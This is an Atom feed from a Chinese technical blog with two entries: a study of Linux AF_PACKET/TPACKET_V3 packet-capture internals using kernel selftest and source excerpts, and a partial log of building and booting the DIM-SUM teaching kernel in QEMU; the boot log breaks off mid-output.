<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>rutk1t0r&#39;s blog</title>
  
  <subtitle>Developer and Researcher</subtitle>
  <link href="/embpgp.github.io/atom.xml" rel="self"/>
  
  <link href="https://embpgp.github.io/"/>
  <updated>2025-03-12T09:01:31.549Z</updated>
  <id>https://embpgp.github.io/</id>
  
  <author>
    <name>rutk1t0r</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>psock_tpacket实践</title>
    <link href="https://embpgp.github.io/2025/03/11/psock-tpacket%E5%AE%9E%E8%B7%B5/"/>
    <id>https://embpgp.github.io/2025/03/11/psock-tpacket实践/</id>
    <published>2025-03-11T14:41:54.000Z</published>
    <updated>2025-03-12T09:01:31.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>抓包原理初识</p></blockquote><span id="more"></span><p>参考资料:<br><a href="https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.10.1.tar.gz">https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.10.1.tar.gz</a><br><a href="https://docs.kernel.org/networking/packet_mmap.html">https://docs.kernel.org/networking/packet_mmap.html</a><br><a href="https://www.zhihu.com/question/486178226/answer/2587632732">https://www.zhihu.com/question/486178226/answer/2587632732</a><br><a href="https://jgsun.github.io/2019/01/21/linux-tcpdump/">https://jgsun.github.io/2019/01/21/linux-tcpdump/</a></p><hr><blockquote><p>分析 tools/testing/selftests/net/psock_tpacket.c</p></blockquote><h1 id="下载内核源码并编译测试程序"><a href="#下载内核源码并编译测试程序" class="headerlink" title="下载内核源码并编译测试程序"></a>下载内核源码并编译测试程序</h1><p><code>cd linux-3.10.1/tools/testing/selftests/net &amp;&amp; make</code><br><img src="/images/tpacket_01.png" alt="tpacket_compile"></p><h1 id="分析初始化"><a href="#分析初始化" class="headerlink" title="分析初始化"></a>分析初始化</h1><p>首先定位到pfsocket函数，其中需要初始化一个domain为PF_PACKET，type为SOCK_RAW的套接字，通过分析PF_PACKET是宏定义AF_PACKET一样的值，<br>而在Linux内核的介绍当中AF_PACKET专门用来嗅探流量用的，类似wireshark和tcpdump;当调用到setsockopt的时候，内核对应packet_setsockopt函数，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pfsocket</span><span class="params">(<span class="keyword">int</span> ver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line"><span class="keyword">if</span> (sock == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = setsockopt(sock, SOL_PACKET, PACKET_VERSION, &amp;ver, <span class="keyword">sizeof</span>(ver));</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接看V3版本（当然最正确的方式是根据当前内核支持的版本自动选择v1/v2/v3）,设置版本的时候只是简单给po-&gt;tp_version赋值。<br>当再次调用设置PACKET_RX_RING或者PACKET_TX_RING的时候，会进入到packet_set_ring，这里会根据应用层的配置（例如使用mmap方案）来决定使用<br>哪个收包函数，在有环形缓冲区的方案情况下，会调用<code>pg_vec = alloc_pg_vec(req, order);</code> 申请内存页面，并指向当前的sock的，等待后续应用层调用<br>mmap的时候，通过给应用程序插入vma并指向同样的内存区域，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line"><span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (optlen &lt; len)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (pkt_sk(sk)-&gt;has_vnet_hdr)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;req_u.req, optval, len))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">return</span> packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">optname == PACKET_TX_RING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> PACKET_VERSION:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optlen != <span class="keyword">sizeof</span>(val))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;val, optval, <span class="keyword">sizeof</span>(val)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">switch</span> (val) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">po-&gt;tp_version = val;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在这里会判断是否有环形缓冲区来决定采用哪个收包函数<br><code>po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?                         tpacket_rcv : packet_rcv;</code></p><p>两者的差异可以参考上述 <a href="https://jgsun.github.io/2019/01/21/linux-tcpdump/">https://jgsun.github.io/2019/01/21/linux-tcpdump/</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> (closing || atomic_read(&amp;po-&gt;mapped) == <span class="number">0</span>) &#123;</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line">spin_lock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line">swap(rb-&gt;pg_vec, pg_vec);</span><br><span class="line">rb-&gt;frame_max = (req-&gt;tp_frame_nr - <span class="number">1</span>);</span><br><span class="line">rb-&gt;head = <span class="number">0</span>;</span><br><span class="line">rb-&gt;frame_size = req-&gt;tp_frame_size;</span><br><span class="line">spin_unlock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line"></span><br><span class="line">swap(rb-&gt;pg_vec_order, order);</span><br><span class="line">swap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);</span><br><span class="line"></span><br><span class="line">rb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;</span><br><span class="line">po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?</span><br><span class="line">tpacket_rcv : packet_rcv;</span><br><span class="line">skb_queue_purge(rb_queue);</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line">pr_err(<span class="string">&quot;packet_mmap: vma is busy: %d\n&quot;</span>,</span><br><span class="line">       atomic_read(&amp;po-&gt;mapped));</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>也可以简单查看下面的视图。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|  Network Interface  |</span><br><span class="line">+----------+----------+</span><br><span class="line">           |</span><br><span class="line">           v</span><br><span class="line">+----------+----------+</span><br><span class="line">|   Protocol Hook     |</span><br><span class="line">|   (prot_hook.func)  +---&gt; [ tpacket_rcv ] 带环形缓冲区</span><br><span class="line">|                     |       |</span><br><span class="line">+----------+----------+       | 直接写入共享内存</span><br><span class="line">           |                  |</span><br><span class="line">           |                  v</span><br><span class="line">           |        +---------+---------+</span><br><span class="line">           |        |  Ring Buffer      |</span><br><span class="line">           |        | (pg_vec)          |</span><br><span class="line">           |        +-------------------+</span><br><span class="line">           |</span><br><span class="line">           v</span><br><span class="line">+----------+----------+</span><br><span class="line">|   packet_rcv        +---&gt; 传统接收路径</span><br><span class="line">|                     |      (sk_receive_queue)</span><br><span class="line">+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当应用程序调用mmap的时候，其中第一个参数fd是PF_PACKET类型的，最终会调用到内核的packet_mmap函数，通过调用<code>vm_insert_page</code><br>将环形缓冲区的地址插入到进程的vma里面，应用程序可以正常访问。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">start = vma-&gt;vm_start;</span><br><span class="line"><span class="keyword">for</span> (rb = &amp;po-&gt;rx_ring; rb &lt;= &amp;po-&gt;tx_ring; rb++) &#123;</span><br><span class="line"><span class="keyword">if</span> (rb-&gt;pg_vec == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rb-&gt;pg_vec_len; i++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">void</span> *kaddr = rb-&gt;pg_vec[i].buffer;</span><br><span class="line"><span class="keyword">int</span> pg_num;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (pg_num = <span class="number">0</span>; pg_num &lt; rb-&gt;pg_vec_pages; pg_num++) &#123;</span><br><span class="line">page = pgv_to_page(kaddr);</span><br><span class="line">err = vm_insert_page(vma, start, page);</span><br><span class="line"><span class="keyword">if</span> (unlikely(err))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">start += PAGE_SIZE;</span><br><span class="line">kaddr += PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而后就是bind具体的网卡，可以选择any，这里可以通过SOL_SOCKET层配合SO_ATTACH_FILTER，注入类似于tcpdump的过滤语法规则，而后数据流就开始了。</p><h1 id="AF-PACKET收包流程"><a href="#AF-PACKET收包流程" class="headerlink" title="AF_PACKET收包流程"></a>AF_PACKET收包流程</h1><p>当应用层通过poll或者其他的轮询方式发现rx_ring有可读的数据的时候，就可以将数据包做进一步处理了。正常网卡先通过软中断经过gro等操作后，在进入协议栈之前<br>会在<code>__netif_receive_skb_core</code>函数寻找注册的ptype_all找到回调函数，在这里<br>AF_PACKET的就是tpacket_rcv。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">list_for_each_entry_rcu(ptype, &amp;ptype_all, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ptype-&gt;dev || ptype-&gt;dev == skb-&gt;dev) &#123;</span><br><span class="line"><span class="keyword">if</span> (pt_prev)</span><br><span class="line">ret = deliver_skb(skb, pt_prev, orig_dev);</span><br><span class="line">pt_prev = ptype;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑<code>run_filter</code>是否匹配目标数据包，若不命中就直接跳过，否则通过<br><code>h.raw = packet_current_rx_frame(po, skb,                     TP_STATUS_KERNEL, (macoff+snaplen));</code>寻找一个<br>空闲frame，调用<code>skb_copy_bits(skb, 0, h.raw + macoff, snaplen);</code>将skb的线性区和分片区（若有，存储在skb_shinfo指向的多个页面以及关联的SKB分片链表一次性拷贝到<code>h.raw + macoff</code>,而后更新status，并通过<code>sk-&gt;sk_data_ready(sk, 0);</code>唤醒应用进程，此时应用层拿到的frame就是现成的数据包了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">snaplen = skb-&gt;len;</span><br><span class="line"></span><br><span class="line">res = run_filter(skb, sk, snaplen);</span><br><span class="line"><span class="keyword">if</span> (!res)</span><br><span class="line"><span class="keyword">goto</span> drop_n_restore;</span><br><span class="line"><span class="keyword">if</span> (snaplen &gt; res)</span><br><span class="line">snaplen = res;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="应用层处理"><a href="#应用层处理" class="headerlink" title="应用层处理"></a>应用层处理</h1><p>V3版本直接调用walk_v3_rx处理，通过<code>__v3_walk_block</code>将数据包摘下来（比如在拷贝到预申请的应用层缓冲区，然后调用<code>__v3_flush_block</code>刷新块状态，内核便可以继续读写该块。</p><blockquote><p>这里可以简单再用一个udp套接字，将拿到的数据包，再通过<code>sendto</code>转发出去（流量采集），以实现类似网络流量分析的功能。考虑到CPU开销问题，有一些优化思路：<br>1、可以先用sendmmsg批量发送（内核最大1024），即应用层每缓存1024的数据包发起一次系统调用，将数据批量拷贝到内核发送，以降低系统调用次数；2、通过AF_PACKET的发送缓冲区mmap，直接从rx_ring摘下来后，稍微”加工”一下写入另一个AF_PACKET发送出去，这就需要自己构造L2-L4等，进一步降低拷贝带来的CPU开销。3、通过将GRO的思想移植到应用层，进一步降低发送端PPS，这样的话就需要应用层缓存抓取的流量，需要实际的测试数据对比第2点。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">walk_v3</span><span class="params">(<span class="keyword">int</span> sock, struct ring *ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ring-&gt;type == PACKET_RX_RING)</span><br><span class="line">walk_v3_rx(sock, ring);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">bug_on(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">walk_v3_rx</span><span class="params">(<span class="keyword">int</span> sock, struct ring *ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> block_num = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pfd</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_desc</span> *<span class="title">pbd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> udp_sock[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        bug_on(ring-&gt;type != PACKET_RX_RING);</span><br><span class="line"></span><br><span class="line">        pair_udp_open(udp_sock, PORT_BASE);</span><br><span class="line">        pair_udp_setfilter(sock);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;pfd, <span class="number">0</span>, <span class="keyword">sizeof</span>(pfd));</span><br><span class="line">        pfd.fd = sock;</span><br><span class="line">        pfd.events = POLLIN | POLLERR;</span><br><span class="line">        pfd.revents = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pair_udp_send(udp_sock, NUM_PACKETS);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (total_packets &lt; NUM_PACKETS * <span class="number">2</span>) &#123;</span><br><span class="line">                pbd = (struct block_desc *) ring-&gt;rd[block_num].iov_base;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> ((BLOCK_STATUS(pbd) &amp; TP_STATUS_USER) == <span class="number">0</span>)</span><br><span class="line">                        poll(&amp;pfd, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                __v3_walk_block(pbd, block_num);</span><br><span class="line">                __v3_flush_block(pbd);</span><br><span class="line"></span><br><span class="line">                block_num = (block_num + <span class="number">1</span>) % ring-&gt;rd_num;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pair_udp_close(udp_sock);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (total_packets != <span class="number">2</span> * NUM_PACKETS) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;walk_v3_rx: received %u out of %u pkts\n&quot;</span>,</span><br><span class="line">                        total_packets, NUM_PACKETS);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot; %u pkts (%u bytes)&quot;</span>, NUM_PACKETS, total_bytes &gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><p>结合ebpf技术，轻量级agent支持旁路https解密，分析主动外联场景。 参考<a href="https://github.com/gojue/ecapture">https://github.com/gojue/ecapture</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;抓包原理初识&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
      <category term="misc" scheme="https://embpgp.github.io/categories/study/misc/"/>
    
    
      <category term="C/C++" scheme="https://embpgp.github.io/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>DIM-SUM学习</title>
    <link href="https://embpgp.github.io/2022/01/16/%E5%BC%80%E5%B9%B4%E7%AC%AC%E4%B8%80%E7%AF%87%20DIM-SUM%20%E5%85%A5%E9%97%A8/"/>
    <id>https://embpgp.github.io/2022/01/16/开年第一篇 DIM-SUM 入门/</id>
    <published>2022-01-16T11:35:40.000Z</published>
    <updated>2025-03-11T12:17:04.191Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>DIM-SUM内核学习,先跑起来吧。</p></blockquote><span id="more"></span><hr><p><strong>参考资料</strong></p><ul><li><a href="https://gitee.com/xiebaoyou/dim-sum">DIM-SUM仓库</a></li></ul><hr><h1 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h1><p>之前很早有关注过作者，后面逐渐听说有设计操作系统内核的计划，今年偶然听说出了一本新书，就买来学习了。</p><h1 id="跑起来"><a href="#跑起来" class="headerlink" title="跑起来"></a>跑起来</h1><p>拿到书籍后里面有读者服务的二维码，所以就从那里面先拿到了源码包以及《答案.docx》。后续可以直接参考gitee上的教程跑。</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><blockquote><p>编译少库的问题自行搜索解决即可，我的系统是ubuntu 20.04</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">rutk1t0r@ubuntu:~/dev/dim-sum/dim-sum/src$ ./build.sh </span><br><span class="line">  CHK     include/linux/version.h</span><br><span class="line">  CHK     include/generated/utsrelease.h</span><br><span class="line">  CALL    scripts/checksyscalls.sh</span><br><span class="line">grep: scripts/../arch/x86/syscalls/syscall_32.tbl: No such file or directory</span><br><span class="line">  CHK     include/generated/compile.h</span><br><span class="line">  CC      kernel/<span class="built_in">sched</span>/core.o</span><br><span class="line">  LD      kernel/<span class="built_in">sched</span>/built-in.o</span><br><span class="line">  LD      kernel/built-in.o</span><br><span class="line">  LD      vmlinux.o</span><br><span class="line">  MODPOST vmlinux.o</span><br><span class="line">WARNING: modpost: Found 20 section mismatch(es).</span><br><span class="line">To see full details build your kernel with:</span><br><span class="line"><span class="string">&#x27;make CONFIG_DEBUG_SECTION_MISMATCH=y&#x27;</span></span><br><span class="line">  GEN     .version</span><br><span class="line">  CHK     include/generated/compile.h</span><br><span class="line">  UPD     include/generated/compile.h</span><br><span class="line">  CC      init/version.o</span><br><span class="line">  LD      init/built-in.o</span><br><span class="line">  LD      .tmp_vmlinux1</span><br><span class="line">  KSYM    .tmp_kallsyms1.S</span><br><span class="line">  AS      .tmp_kallsyms1.o</span><br><span class="line">  LD      .tmp_vmlinux2</span><br><span class="line">  KSYM    .tmp_kallsyms2.S</span><br><span class="line">  AS      .tmp_kallsyms2.o</span><br><span class="line">  LD      vmlinux</span><br><span class="line">  SYSMAP  System.map</span><br><span class="line">  SYSMAP  .tmp_System.map</span><br><span class="line">  OBJCOPY arch/arm64/boot/Image</span><br><span class="line">  Kernel: arch/arm64/boot/Image is ready</span><br><span class="line">rutk1t0r@ubuntu:~/dev/dim-sum/dim-sum/src$ </span><br></pre></td></tr></table></figure><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">rutk1t0r@ubuntu:~/dev/dim-sum/dim-sum/src$ ./run.sh </span><br><span class="line">WARNING: Image format was not specified <span class="keyword">for</span> <span class="string">&#x27;./dim-sum.img&#x27;</span> and probing guessed raw.</span><br><span class="line">         Automatically detecting the format is dangerous <span class="keyword">for</span> raw images, write operations on block 0 will be restricted.</span><br><span class="line">         Specify the <span class="string">&#x27;raw&#x27;</span> format explicitly to remove the restrictions.</span><br><span class="line">W: /etc/qemu-ifup: no bridge <span class="keyword">for</span> guest interface found</span><br><span class="line">simple console is ready.</span><br><span class="line">timer_rate is 62500000.</span><br><span class="line">io scheduler noop registered(default)</span><br><span class="line">xby_debug <span class="keyword">in</span> virtio_mmio_setup, 1, 554d4551.</span><br><span class="line">xby_debug <span class="keyword">in</span> virtio_mmio_setup, 2, 554d4551.</span><br><span class="line">xby_debug <span class="keyword">in</span> virtio_dev_match, id-&gt;vendor:-1, id-&gt;device:2.</span><br><span class="line">xby_debug <span class="keyword">in</span> virtio_dev_match, dev-&gt;vendor:1431127377, dev-&gt;device:2.</span><br><span class="line">xby_debug <span class="keyword">in</span> virtblk_probe, vda</span><br><span class="line">......</span><br><span class="line">LWIP-1.4.1 TCP/IP initialized.</span><br><span class="line">xby_debug <span class="keyword">in</span> __cpu_launch, 1.</span><br><span class="line">xby_debug <span class="keyword">in</span> psci_launch_cpu, pa is 0000000040158020.</span><br><span class="line">xby_debug <span class="keyword">in</span> 